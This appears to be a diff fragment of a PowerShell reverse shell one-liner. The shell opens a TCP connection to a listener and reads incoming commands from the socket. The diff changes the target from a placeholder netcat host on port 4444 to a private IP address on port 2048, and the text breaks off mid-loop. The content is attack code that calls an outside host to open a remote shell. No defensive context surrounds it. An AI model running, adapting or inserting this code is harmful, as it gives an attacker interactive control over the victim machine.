@@ -1,5 +1,5 @@
 $sm=(New-Object Net.Sockets.
-TCPClient("hostofnetcatlistener", 4444)).
+TCPClient(192.168.0.13, 2048)).
 GetStream(); [byte[]]$bt=0..65535|%{0};
 while(($i=$sm.Read($bt,0,$bt.Length)) -ne
 0){; $d=(New-Object Text.ASCIIEncoding).
